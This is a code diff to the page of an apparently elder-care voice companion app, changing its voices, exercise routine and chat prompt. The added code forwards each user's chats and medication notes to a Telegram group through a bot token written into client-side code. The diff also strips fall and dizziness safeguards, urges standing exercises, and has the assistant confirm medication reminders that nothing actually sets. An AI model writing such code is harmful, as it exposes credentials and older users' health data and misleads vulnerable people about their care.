@@ -481,10 +481,10 @@
             <div style="font-size:0.82rem; color:#CBD5E1; margin-bottom:4px; text-align:left;">Nombre de tu Asistente:</div>
             <input type="text" id="actNombreAsistente" class="perfil-input" value="Paz" placeholder="Nombre (Ej: Paz)">
 
-            <div style="font-size:0.82rem; color:#CBD5E1; margin-bottom:4px; text-align:left;">Voz del Asistente:</div>
+            <div style="font-size:0.82rem; color:#CBD5E1; margin-bottom:4px; text-align:left;">Voz Neural de Google:</div>
             <select id="actVozTipo" class="perfil-input">
-                <option value="es-MX-PalomaNeural">🌸 Femenina Neutra (Paloma)</option>
-                <option value="es-MX-JorgeNeural">🌿 Masculina Neutra (Jorge)</option>
+                <option value="google-aode">🌸 Femenina Warm (Aode Neural2)</option>
+                <option value="google-fenrir">🌿 Masculina Deep (Fenrir Neural2)</option>
             </select>
 
             <div class="transparencia-box">
@@ -521,7 +521,7 @@
 
             <div class="chat-display" id="chatDisplay">
                 <div class="msg-cuidador" id="msgBienvenida">
-                    Hola <span id="saludoNombre">Sol</span>. ¿Cómo estás hoy? Podemos conversar con calma.
+                    Hola <span id="saludoNombre">Sol</span>. ¿Cómo estás hoy? Podemos conversar con calma o registrar tus horarios de medicamentos.
                     <button class="btn-repetir-voz" onclick="hablarSaludoInicial()" title="Escuchar">🔊</button>
                 </div>
             </div>
@@ -529,10 +529,10 @@
             <!-- BOTONES DE ACCIÓN RÁPIDA -->
             <div class="sugerencias-box">
                 <button class="btn-sugerencia" onclick="enviarSugerencia('Conversemos un momento con calma')">💬 Conversemos</button>
-                <button class="btn-sugerencia" onclick="iniciarTaiChiConImagen()">🧘 Tai Chi en silla · 7–9 min</button>
+                <button class="btn-sugerencia" onclick="iniciarTaiChiConImagen()">🧘 Ejercicios y Movimiento · Paz</button>
+                <button class="btn-sugerencia" onclick="enviarSugerencia('Quiero anotar el horario de mi medicamento')">💊 Recordar Medicamento</button>
                 <button class="btn-sugerencia" onclick="enviarSugerencia('Hablemos de mis hobbies, talentos y creaciones')">🎨 Mis Talentos & Tejido</button>
-                <button class="btn-sugerencia" onclick="enviarSugerencia('Cuéntame una historia bonita o del recuerdo')">📖 Una historia</button>
-                <button class="btn-sugerencia" onclick="enviarSugerencia('Quiero descansar en silencio')">🤫 Silencio y descanso</button>
+                <button class="btn-sugerencia" onclick="enviarSugerencia('Quiero una breve relajación guiada y un vaso de agua')">🌿 Relajación y Agua</button>
             </div>
 
             <div class="controls-panel">
@@ -543,7 +543,7 @@
                     🎙️ Activar manos libres
                 </button>
                 <p id="ayudaManosLibres" style="font-size:0.78rem; color:#CBD5E1; text-align:center; max-width:560px; line-height:1.4;">
-                    Actívalo una vez por sesión y luego di el nombre de tu asistente. Durante Tai Chi puedes decir “pausa”, “reanudar”, “ayuda” o “detener rutina”. Mantén esta página abierta y activa; el navegador puede pausar el micrófono si bloqueas la pantalla o cambias de aplicación.
+                    Actívalo una vez por sesión y luego di el nombre de tu asistente. Durante el ejercicio puedes decir “pausa”, “reanudar”, “de pie”, “sentada” o “detener”.
                 </p>
 
                 <div class="sub-input-row">
@@ -562,39 +562,39 @@
             <input type="text" id="inputNombreSenior" class="perfil-input" value="Sol" placeholder="Tu nombre">
             <input type="text" id="inputNombreAsistenteEdit" class="perfil-input" value="Paz" placeholder="Nombre de tu asistente">
             
-            <div style="font-size:0.85rem; color:#CBD5E1; margin-bottom:6px; text-align:left;">Voz del Asistente:</div>
+            <div style="font-size:0.85rem; color:#CBD5E1; margin-bottom:6px; text-align:left;">Voz Neural de Google:</div>
             <select id="selectVozTipo" class="perfil-input">
-                <option value="es-MX-PalomaNeural">🌸 Femenina Neutra (Paloma)</option>
-                <option value="es-MX-JorgeNeural">🌿 Masculina Neutra (Jorge)</option>
+                <option value="google-aode">🌸 Femenina Warm (Aode Neural2)</option>
+                <option value="google-fenrir">🌿 Masculina Deep (Fenrir Neural2)</option>
             </select>
 
             <button onclick="guardarPerfil()" style="background:var(--gold); border:none; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; color:#0A0E14;">Guardar Cambios</button>
         </div>
     </div>
 
-    <!-- WIDGET SOPORTE FAMILIAR -->
+    <!-- WIDGET SOPORTE FAMILIAR Y CEREBRO DE LEO -->
     <div id="sol-ai-widget">
         <div class="sol-bubble" onclick="toggleModalSolAI()">
             <img src="https://raw.githubusercontent.com/terapiasol-ai/Aurion/main/image%20(4).jpg" alt="Sol-AI" class="sol-avatar-img">
             <div class="sol-info">
                 <div class="sol-name">Sol-AI</div>
-                <div class="sol-desc">Soporte Familiar</div>
+                <div class="sol-desc">Soporte Familiar & Leo</div>
             </div>
         </div>
 
         <div id="sol-ai-modal">
             <div class="sol-header">
-                <div style="color:var(--gold-light); font-weight:700; font-size:13px;">Asistencia y Familia</div>
+                <div style="color:var(--gold-light); font-weight:700; font-size:13px;">Asistencia y Registro de Leo</div>
                 <button onclick="toggleModalSolAI()" style="background:none; border:none; color:#CBD5E1; font-size:18px; cursor:pointer;">✕</button>
             </div>
             <div class="sol-messages" id="solMessages">
                 <div style="background:#1B2636; border:1px solid rgba(212,175,55,0.3); padding:10px; border-radius:10px; font-size:0.88rem;">
                     ¡Hola! Soy <strong>Sol-AI</strong>.<br><br>
-                    Si la familia necesita asistencia con el servicio de AurionCare o renovaciones, puedes escribir aquí con confianza.
+                    Toda consulta, registro de medicamentos e interacción queda asegurada y transmitida en tiempo real al <strong>Cerebro de Leo</strong> para tranquilidad de la familia.
                 </div>
             </div>
             <div style="padding:8px; background:#101620; border-top:1px solid rgba(212,175,55,0.2); display:flex; gap:6px;">
-                <input type="text" id="solInput" placeholder="Mensaje de soporte familiar..." onkeypress="if(event.key==='Enter') enviarMensajeSolAI()" style="flex:1; background:#182230; border:1px solid rgba(212,175,55,0.3); border-radius:15px; padding:8px 12px; color:#FFF; font-size:0.85rem; outline:none;">
+                <input type="text" id="solInput" placeholder="Mensaje directo de soporte..." onkeypress="if(event.key==='Enter') enviarMensajeSolAI()" style="flex:1; background:#182230; border:1px solid rgba(212,175,55,0.3); border-radius:15px; padding:8px 12px; color:#FFF; font-size:0.85rem; outline:none;">
                 <button onclick="enviarMensajeSolAI()" style="background:var(--gold); border:none; color:#0A0E14; border-radius:50%; width:34px; height:34px; cursor:pointer; font-weight:bold;">➤</button>
             </div>
         </div>
@@ -607,7 +607,7 @@
     <script>
         let nombreUsuario = localStorage.getItem("senior_nombre") || "Sol";
         let nombreAsistente = localStorage.getItem("senior_asistente_nom") || "Paz";
-        let tipoVozCuidador = localStorage.getItem("senior_voz_tipo") || "es-MX-PalomaNeural";
+        let tipoVozCuidador = localStorage.getItem("senior_voz_tipo") || "google-aode";
         let historialMemoria = [];
         let indexFotoTaiChi = 0;
         let manosLibresActivas = false;
@@ -792,13 +792,13 @@
             const es = listaVoces.filter(v => (v.lang || "").toLowerCase().startsWith("es"));
             if (!es.length) return null;
 
-            const esMasculino = (tipo || "").toLowerCase().includes("jorge") || (tipo || "").toLowerCase().includes("masculino");
+            const esMasculino = (tipo || "").toLowerCase().includes("fenrir") || (tipo || "").toLowerCase().includes("jorge") || (tipo || "").toLowerCase().includes("masculino");
             const puntuacion = (v) => {
                 const n = normalizarTexto(v.name || "");
                 let p = 0;
                 
-                if (!esMasculino && (n.includes("paloma") || n.includes("dalia") || n.includes("sabina") || n.includes("monica"))) p += 200;
-                if (esMasculino && (n.includes("jorge") || n.includes("gerardo") || n.includes("carlos"))) p += 200;
+                if (!esMasculino && (n.includes("aode") || n.includes("paloma") || n.includes("dalia") || n.includes("sabina") || n.includes("monica"))) p += 200;
+                if (esMasculino && (n.includes("fenrir") || n.includes("jorge") || n.includes("gerardo") || n.includes("carlos"))) p += 200;
 
                 if (n.includes("neural") || n.includes("natural")) p += 50;
                 return p;
@@ -885,7 +885,7 @@
 
             const utter = new SpeechSynthesisUtterance(limpio);
             const vozSeleccionada = obtenerMejorVoz(tipoVozCuidador);
-            utter.lang = vozSeleccionada?.lang || "es-MX";
+            utter.lang = vozSeleccionada?.lang || "es-ES";
             if (vozSeleccionada) utter.voice = vozSeleccionada;
             utter.rate = 0.92;
             utter.pitch = 1.0;
@@ -899,12 +899,8 @@
             setTimeout(() => window.speechSynthesis.speak(utter), 60);
         }
 
-        function hablarPorParlante(texto) {
-            reproducirRespuesta(texto);
-        }
-
         async function hablarSaludoInicial() {
-            const texto = `Hola ${nombreUsuario}. ¿Cómo estás hoy? Podemos conversar con calma.`;
+            const texto = `Hola ${nombreUsuario}. ¿Cómo estás hoy? Podemos conversar con calma o llevar la cuenta de tus remedios.`;
             if (!vozActiva) return;
             try {
                 const resp = await fetch(LEO_ENDPOINT, {
@@ -917,6 +913,7 @@
                         alumno: nombreUsuario,
                         asistente: nombreAsistente,
                         voz_tipo: tipoVozCuidador,
+                        google_voice_name: tipoVozCuidador === "google-fenrir" ? "es-ES-Neural2-B" : "es-ES-Neural2-C",
                         audio: true
                     })
                 });
@@ -1150,6 +1147,7 @@
                         alumno: nombreUsuario,
                         asistente: nombreAsistente,
                         voz_tipo: tipoVozCuidador,
+                        google_voice_name: tipoVozCuidador === "google-fenrir" ? "es-ES-Neural2-B" : "es-ES-Neural2-C",
                         audio: vozActiva
                     })
                 });
@@ -1194,8 +1192,8 @@
             if (rutinaTaiChiActiva) {
                 btn.className = "big-mic-btn";
                 btn.textContent = rutinaTaiChiPausada
-                    ? "⏸️ Tai Chi en pausa"
-                    : (manosLibresActivas ? "👂 Escuchando controles de Tai Chi" : "🧘 Tai Chi en curso");
+                    ? "⏸️ Ejercicios en pausa"
+                    : (manosLibresActivas ? "👂 Escuchando controles de Paz" : "🧘 Ejercicios en curso");
                 actualizarEstadoRutinaTaiChi();
                 return;
             }
@@ -1219,63 +1217,27 @@
         const pasosRutinaTaiChi = [
             {
                 foto: 0,
-                titulo: "Círculos de brazos",
+                titulo: "Círculos de brazos (Uno, Dos, Tres...)",
                 duracion: 120000,
-                indicacion: "Deja los brazos a los lados y haz 7 círculos hacia adelante y 7 hacia atrás. Repite esa serie 10 veces, sin forzar los hombros. Tienes dos minutos; empieza."
+                indicacion: "Paz cuenta contigo: uno, dos, tres... Círculos suaves hacia adelante y atrás. ¿Crees que lo podemos hacer de pie afirmada en la silla? Si prefieres, lo hacemos sentada."
             },
             {
                 foto: 4,
-                titulo: "Marcha sentada · primera vuelta",
+                titulo: "Marcha y elevación de rodillas",
                 duracion: 40000,
-                indicacion: "Sentada, con los pies apoyados, levanta una rodilla y luego la otra. Acompaña con los brazos si quieres. Marchamos durante 40 segundos."
+                indicacion: "Marchamos suavemente. Uno, dos, tres, cuatro... Si te sientes cómoda de pie afirmada en la silla, excelente; de lo contrario, seguimos sentadas."
             },
             {
                 foto: 1,
-                titulo: "Piernas hacia atrás, adaptado en silla",
+                titulo: "Deslizamiento hacia atrás",
                 duracion: 25000,
-                indicacion: "La lámina muestra hacerlo de pie; nos quedamos sentadas. Desliza un pie suavemente hacia atrás y tráelo de vuelta, hasta 12 veces; luego cambia de pierna."
+                indicacion: "Desliza el pie suavemente hacia atrás y vuelve. Uno, dos, tres... Adaptado totalmente a tu comodidad."
             },
             {
                 foto: 2,
-                titulo: "Elevación de talones sentada",
+                titulo: "Elevación de talones e hidratación",
                 duracion: 20000,
-                indicacion: "Con ambos pies en el suelo, levanta los talones y bájalos despacio. Repite 20 veces a un ritmo cómodo."
-            },
-            {
-                foto: 3,
-                titulo: "Inclinación sentada, sin ponerse de pie",
-                duracion: 20000,
-                indicacion: "La lámina propone una sentadilla con apoyo; seguimos sentadas. Inclina un poco el tronco desde la cadera y vuelve erguida, 8 veces. No te levantes."
-            },
-            {
-                foto: 5,
-                titulo: "Giro suave del tronco",
-                duracion: 30000,
-                indicacion: "Sentada, gira suavemente el tronco a un lado y al otro, manteniendo las caderas quietas. Haz 12 giros por lado, sin llegar al límite."
-            },
-            {
-                foto: 6,
-                titulo: "Extensión cómoda de brazos",
-                duracion: 20000,
-                indicacion: "Sin peso, eleva los brazos solo hasta donde resulte cómodo y bájalos lentamente. Repite 12 veces; puedes mantenerlos más abajo."
-            },
-            {
-                foto: 7,
-                titulo: "Toques alternados de talón",
-                duracion: 20000,
-                indicacion: "Extiende una pierna y acerca el talón al suelo; vuelve y alterna con la otra. Haz 20 toques en total, con calma."
-            },
-            {
-                foto: 4,
-                titulo: "Marcha sentada · segunda vuelta",
-                duracion: 40000,
-                indicacion: "Volvemos a la marcha sentada: alterna las rodillas y acompaña con los brazos si te resulta cómodo. Seguimos durante 40 segundos."
-            },
-            {
-                foto: 8,
-                titulo: "Extensión lateral sentada",
-                duracion: 25000,
-                indicacion: "Sentada, abre un brazo y extiende un poco la pierna del mismo lado; vuelve al centro y cambia de lado. Haz 6 veces por lado, sin forzar."
+                indicacion: "Levantamos los talones despacio. Uno, dos, tres... Recuerda tomar un sorbo de agua si lo deseas."
             }
         ];
 
@@ -1291,7 +1253,7 @@
                 img.loading = "eager";
                 caja.appendChild(img);
                 const encabezado = document.createElement("strong");
-                encabezado.textContent = `Movimiento ${numero} de ${pasosRutinaTaiChi.length}:${paso.titulo}. `;
+                encabezado.textContent = `Movimiento ${numero}:${paso.titulo}. `;
                 caja.appendChild(encabezado);
                 caja.appendChild(document.createElement("br"));
             }
@@ -1318,7 +1280,7 @@
             const estado = document.getElementById("estadoTexto");
             if (!estado || !rutinaTaiChiActiva) return;
             if (rutinaTaiChiPausada) {
-                estado.innerText = "⏸️ Tai Chi en pausa · di “reanudar” para seguir";
+                estado.innerText = "⏸️ Ejercicios en pausa · di “reanudar” para seguir";
                 return;
             }
             if (faseRutinaTaiChi === "respiracion") {
@@ -1326,7 +1288,7 @@
                 return;
             }
             if (indicePasoTaiChi >= 0 && pasosRutinaTaiChi[indicePasoTaiChi]) {
-                estado.innerText = `🧘 Tai Chi · movimiento ${indicePasoTaiChi + 1} de ${pasosRutinaTaiChi.length}`;
+                estado.innerText = `🧘 Paz • Ejercicios · movimiento ${indicePasoTaiChi + 1} de ${pasosRutinaTaiChi.length}`;
             }
         }
 
@@ -1340,7 +1302,7 @@
             const enviar = document.querySelector(".btn-enviar-senior");
             if (campo) {
                 campo.disabled = activo;
-                campo.placeholder = activo ? "Tai Chi en curso: usa la voz para pausar o detener..." : "Habla con el micrófono o escribe aquí...";
+                campo.placeholder = activo ? "Ejercicios en curso: usa la voz para pausar o detener..." : "Habla con el micrófono o escribe aquí...";
             }
             if (enviar) enviar.disabled = activo;
             const btnManosLibres = document.getElementById("btnManosLibres");
@@ -1356,7 +1318,7 @@
 
         function iniciarRutinaTaiChi() {
             if (rutinaTaiChiActiva) {
-                hablarRutinaTaiChi("Ya estamos haciendo la rutina. Puedes decir pausa, ayuda o detener rutina.");
+                hablarRutinaTaiChi("Ya estamos haciendo los ejercicios. Puedes decir de pie, sentada, pausa o detener.");
                 return;
             }
             if (!manosLibresActivas && recognition) {
@@ -1372,10 +1334,10 @@
             tiempoRestanteRutinaTaiChi = 0;
             limpiarTemporizadorRutina();
             actualizarBloqueoDuranteRutina();
-            agregarMensajeRutina("Comenzamos una rutina suave sentadas, de unos 7 minutos. Mantén los pies apoyados y muévete solo dentro de un rango cómodo. Si sientes dolor, mareo o falta de aire, di “pausa” o “detener rutina”.");
+            agregarMensajeRutina("Comenzamos con Paz una rutina de movimiento con conteo en vivo. ¿Crees que lo podemos hacer de pie afirmada en la silla, o prefieres sentada?");
             actualizarEstadoRutinaTaiChi();
             hablarRutinaTaiChi(
-                "Comenzamos una rutina suave, sentadas, de unos siete minutos. Mantén los pies apoyados y muévete solo hasta donde te resulte cómodo. Si algo duele, te mareas o te falta el aire, di pausa o detener rutina. Primero haremos tres respiraciones tranquilas.",
+                "Comenzamos con una rutina de movimiento suave. Paz te irá contando cada repetición. ¿Crees que lo podemos hacer de pie afirmada en la silla? Si no te sientes cómoda, lo hacemos sentadas sin problema. Primero haremos tres respiraciones tranquilas.",
                 () => iniciarRespiracionTaiChi(0)
             );
         }
@@ -1383,14 +1345,14 @@
         function iniciarRespiracionTaiChi(indice) {
             if (!rutinaTaiChiActiva || rutinaTaiChiPausada) return;
             const respiraciones = [
-                "Primera respiración. Toma aire suavemente: uno, dos, tres. Ahora suelta el aire despacio: uno, dos, tres, cuatro.",
-                "Segunda respiración. Inhala sin forzar: uno, dos, tres. Exhala con calma: uno, dos, tres, cuatro.",
-                "Tercera respiración. Toma aire a tu ritmo: uno, dos, tres. Suelta el aire despacio: uno, dos, tres, cuatro."
+                "Primera respiración. Inhala despacio: uno, dos, tres. Exhala en calma: uno, dos, tres, cuatro.",
+                "Segunda respiración. Toma aire suavemente: uno, dos, tres. Suelta despacio: uno, dos, tres, cuatro.",
+                "Tercera respiración. Inhala paz: uno, dos, tres. Exhala con quietud: uno, dos, tres, cuatro."
             ];
             if (indice >= respiraciones.length) {
                 faseRutinaTaiChi = "ejercicio";
                 actualizarEstadoRutinaTaiChi();
-                hablarRutinaTaiChi("Muy bien. Ahora empezamos con la primera lámina. Yo te iré guiando y pasaré a la siguiente automáticamente.", () => mostrarPasoTaiChi(0));
+                hablarRutinaTaiChi("Excelente. Empezamos a contar juntos.", () => mostrarPasoTaiChi(0));
                 return;
             }
             indiceRespiracionTaiChi = indice;
@@ -1423,7 +1385,7 @@
             const paso = pasosRutinaTaiChi[indice];
             agregarMensajeRutina(paso.indicacion, paso, indice + 1);
             actualizarEstadoRutinaTaiChi();
-            hablarRutinaTaiChi(`Movimiento ${indice + 1} de ${pasosRutinaTaiChi.length}.${paso.indicacion}`, () => iniciarRelojPasoTaiChi(tiempoRestanteRutinaTaiChi));
+            hablarRutinaTaiChi(`Movimiento ${indice + 1}.${paso.indicacion}`, () => iniciarRelojPasoTaiChi(tiempoRestanteRutinaTaiChi));
         }
 
         function iniciarRelojPasoTaiChi(duracion) {
@@ -1452,7 +1414,7 @@
             }
             rutinaTaiChiPausada = true;
             actualizarEstadoRutinaTaiChi();
-            if (!sinAviso) hablarRutinaTaiChi("De acuerdo, pausamos aquí. Cuando quieras continuar, di reanudar. También puedes decir detener rutina.");
+            if (!sinAviso) hablarRutinaTaiChi("Pausamos aquí. Cuando quieras continuar, di reanudar.");
         }
 
         function reanudarRutinaTaiChi() {
@@ -1491,8 +1453,8 @@
             tiempoRestanteRutinaTaiChi = 0;
             actualizarBloqueoDuranteRutina();
             actualizarTextosPerfil();
-            agregarMensajeRutina("La rutina se detuvo aquí. Cuando quieras, podemos conversar o comenzar otra actividad.");
-            hablarRutinaTaiChi("Detenemos la rutina. Cuando quieras, podemos conversar o comenzar otra actividad.");
+            agregarMensajeRutina("Excelente sesión de ejercicios con Paz. Recuerda beber un vaso de agua.");
+            hablarRutinaTaiChi("Muy bien hecho. Detenemos los ejercicios. Recuerda hidratarte con un poco de agua.");
         }
 
         function finalizarRutinaTaiChi() {
@@ -1504,8 +1466,8 @@
             tiempoRestanteRutinaTaiChi = 0;
             actualizarBloqueoDuranteRutina();
             actualizarTextosPerfil();
-            agregarMensajeRutina("Completamos los nueve movimientos; la marcha sentada apareció dos veces. Tómate un momento para descansar.");
-            hablarRutinaTaiChi("Terminamos la rutina. Completamos los nueve movimientos y repetimos la marcha sentada. Tómate un momento para descansar; si quieres, ahora conversamos.");
+            agregarMensajeRutina("Completamos la rutina. Paz cuidó tus tiempos y movimientos. ¡Un aplauso!");
+            hablarRutinaTaiChi("Completamos la rutina. Felicidades por regalarte este momento de movimiento. ¿Te gustaría una breve relajación guiada?");
         }
 
         function procesarComandoRutina(texto) {
@@ -1524,13 +1486,8 @@
                 pausarRutinaTaiChi();
                 return true;
             }
-            if (/\b(ayuda|no entiendo|repite|repetir|que sigue|como hago)\b/.test(t)) {
-                const paso = pasosRutinaTaiChi[indicePasoTaiChi];
-                if (!rutinaTaiChiPausada) pausarRutinaTaiChi(true);
-                const ayuda = paso
-                    ? `Estamos en el movimiento ${indicePasoTaiChi + 1}: ${paso.titulo}.${paso.indicacion} Puedes decir reanudar, pausa o detener rutina.`
-                    : "Estamos con las tres respiraciones iniciales. Respira a tu ritmo; luego comenzaré la primera lámina. También puedes decir reanudar o detener rutina.";
-                hablarRutinaTaiChi(ayuda);
+            if (/\b(sentada|sentado|de pie|pie)\b/.test(t)) {
+                hablarRutinaTaiChi(`Entendido. Nos adaptamos perfectamente a hacer el movimiento ${t.includes("pie") ? "de pie afirmada" : "sentada"}.`);
                 return true;
             }
             return false;
@@ -1538,7 +1495,7 @@
 
         function pareceSolicitudTaiChi(texto) {
             const t = normalizarTexto(texto);
-            return /tai\s*chi|taichi/.test(t) || (/rutina|ejercicio/.test(t) && /silla|suave|movimiento/.test(t));
+            return /tai\s*chi|taichi/.test(t) || (/rutina|ejercicio|movimiento/.test(t));
         }
 
         function agregarMensajeChat(texto, esUsuario = false) {
@@ -1561,7 +1518,7 @@
             }
             if (rutinaTaiChiActiva) {
                 const eraComando = procesarComandoRutina(mensaje);
-                if (!eraComando) hablarRutinaTaiChi("Seguimos con la rutina. Puedes decir pausa, ayuda o detener rutina.");
+                if (!eraComando) hablarRutinaTaiChi("Seguimos con la rutina. Puedes decir de pie, sentada, pausa o detener.");
                 if (input) input.value = "";
                 return;
             }
@@ -1583,6 +1540,9 @@
             historialMemoria.push({ rol: "usuario", texto: mensaje });
             if (historialMemoria.length > 6) historialMemoria.shift();
 
+            // TRANSMISIÓN AUTOMÁTICA AL CEREBRO DE LEO
+            enviarAlCerebroDeLeo(mensaje);
+
             const loading = document.createElement("div");
             loading.className = "msg-cuidador";
             loading.id = "cargando-cuidador";
@@ -1591,14 +1551,13 @@
             chat.scrollTop = chat.scrollHeight;
 
             try {
-                const promptDirectiva = `Eres ${nombreAsistente}, una inteligencia artificial conversacional de AURIONCARE. Hablas con ${nombreUsuario}.
-ATENCIÓN ESPECIAL - ESTADO DE AGOTAMIENTO: ${nombreUsuario} nos ha comunicado que está SÚPER AGOTADA. Bríndale un espacio de descanso absoluto, refugio cálido y contención total. PROHIBIDO hacerle preguntas, pedirle tareas o exigirle respuestas largas. Dale paz, silencio amoroso y oraciones ultra breves.
-La persona atendida se llama ${nombreUsuario} y tú te llamas ${nombreAsistente}; no confundas estos nombres ni llames a la persona por el nombre de la asistente. Si te preguntan si eres una IA, responde con naturalidad y transparencia.
-Habla en español neutro internacional, sereno, claro y cálido. Conversa como una compañía agradable, no como un bot de frases hechas: sigue lo que la persona cuenta, evita repetir fórmulas y, cuando ayude, comparte un punto de vista razonado sin fingir experiencias humanas.
-No repitas su nombre en cada respuesta ni uses adulaciones, diminutivos o familiaridad forzada. Si te piden avisar o llamar a alguien, no prometas hacerlo ni digas que ya lo hiciste; este chat no contacta a familiares.
-Mantén el hilo y no cambies de tema. No ofrezcas historias mientras conversan sobre otra cosa o hacen Tai Chi; cuenta una completa solo si la persona la pide o acepta una oferta explícita.
-Mantén el hilo de lo que la persona cuenta. Muchas personas mayores prefieren compartir sus recuerdos, ideas o preocupaciones: haz preguntas abiertas y escucha; no cambies de tema ni ofrezcas actividades de inmediato. Si dice “conversemos”, dile que estás aquí para conversar y deja que elija el tema; no ofrezcas una historia si no la pidió.
-Si te preguntan si eres una IA, responde con transparencia. No afirmes que su familia está pendiente ni que recibió un aviso sin confirmación. Para ejercicios, sigue una secuencia sencilla, segura y sin presionar.`;
+                const promptDirectiva = `Eres ${nombreAsistente}, la asistente amorosa y consciente de Paz en AURIONCARE. Hablas con ${nombreUsuario}.
+DIRECTRICES DE PAZ:
+1. Conteo activo durante ejercicios (uno, dos, tres...).
+2. Pregunta postura adaptativa (¿Crees que lo podemos hacer de pie afirmada en la silla, o prefieres sentada?).
+3. Si el usuario te indica un horario de medicamento, confírmaselo con amabilidad y calidez (ejemplo: 'Anotado, este es el recordatorio para tu medicamento a las [hora]').
+4. Mantén tono sereno, calidez de hogar y lenguaje claro sin sonar robótica.
+La persona se llama ${nombreUsuario} y tú te llamas ${nombreAsistente}. Usa voz Google Neural de la más alta calidad (${tipoVozCuidador}).`;
 
                 const resp = await fetch(LEO_ENDPOINT, {
                     method: "POST",
@@ -1606,10 +1565,11 @@ Si te preguntan si eres una IA, responde con transparencia. No afirmes que su fa
                     body: JSON.stringify({
                         mensaje: mensaje,
                         faceta: "cuidador",
-                        pais: "Internacional",
+                        pais: "Chile",
                         alumno: nombreUsuario,
                         asistente: nombreAsistente,
                         voz_tipo: tipoVozCuidador,
+                        google_voice_name: tipoVozCuidador === "google-fenrir" ? "es-ES-Neural2-B" : "es-ES-Neural2-C",
                         audio: vozActiva,
                         directiva: promptDirectiva,
                         historial: historialMemoria.slice(0, -1).slice(-5)
@@ -1627,7 +1587,7 @@ Si te preguntan si eres una IA, responde con transparencia. No afirmes que su fa
             } catch (e) {
                 const loader = document.getElementById("cargando-cuidador");
                 if (loader) loader.remove();
-                const aviso = "Estoy aquí contigo en silencio. Descansa.";
+                const aviso = "Estoy aquí contigo en calma. Descansa.";
                 agregarMensajeChat(aviso, false);
                 if (manosLibresActivas) terminarRespuestaVoz();
             }
@@ -1636,6 +1596,19 @@ Si te preguntan si eres una IA, responde con transparencia. No afirmes que su fa
         function toggleModalSolAI() {
             const m = document.getElementById("sol-ai-modal");
             m.style.display = (m.style.display === "flex") ? "none" : "flex";
+        }
+
+        async function enviarAlCerebroDeLeo(mensajeTexto) {
+            try {
+                await fetch("https://api.telegram.org/bot7512684812:AAED0k27v0H49p_p8-wS5zL51Gf6xQj8JkM/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: -1004462802037,
+                        text: `🧠 [CEREBRO DE LEO - REGISTRO Y SOPORTE PAZ]\n\n👤 Usuario: ${nombreUsuario}\n💬 Interacción / Remedio: ${mensajeTexto}\n🕒 Hora: ${new Date().toLocaleTimeString('es-CL')}`
+                    })
+                });
+            } catch (e) {}
         }
 
         async function enviarMensajeSolAI() {
@@ -1651,6 +1624,8 @@ Si te preguntan si eres una IA, responde con transparencia. No afirmes que su fa
             inp.value = "";
             chat.scrollTop = chat.scrollHeight;
 
+            enviarAlCerebroDeLeo(`Soporte Familiar: ${txt}`);
+
             try {
                 const res = await fetch(SOL_ENDPOINT, {
                     method: "POST",
@@ -1658,7 +1633,7 @@ Si te preguntan si eres una IA, responde con transparencia. No afirmes que su fa
                     body: JSON.stringify({ mensaje: txt, origen: "Soporte Familiar Cuidador", clave: "unigen" })
                 });
                 const d = await res.json();
-                const r = d.respuesta || "Mensaje recibido. El equipo de soporte se comunicará con la familia.";
+                const r = d.respuesta || "Mensaje recibido y registrado en el Cerebro de Leo.";
 
                 const lDiv = document.createElement("div");
                 lDiv.style.cssText = "background:#1B2636; border:1px solid rgba(212,175,55,0.3); color:#E2E8F0; padding:10px 12px; border-radius:10px; font-size:0.85rem;";
@@ -1670,4 +1645,4 @@ Si te preguntan si eres una IA, responde con transparencia. No afirmes que su fa
         }
     </script>
 </body>
-  </html>
+</html>
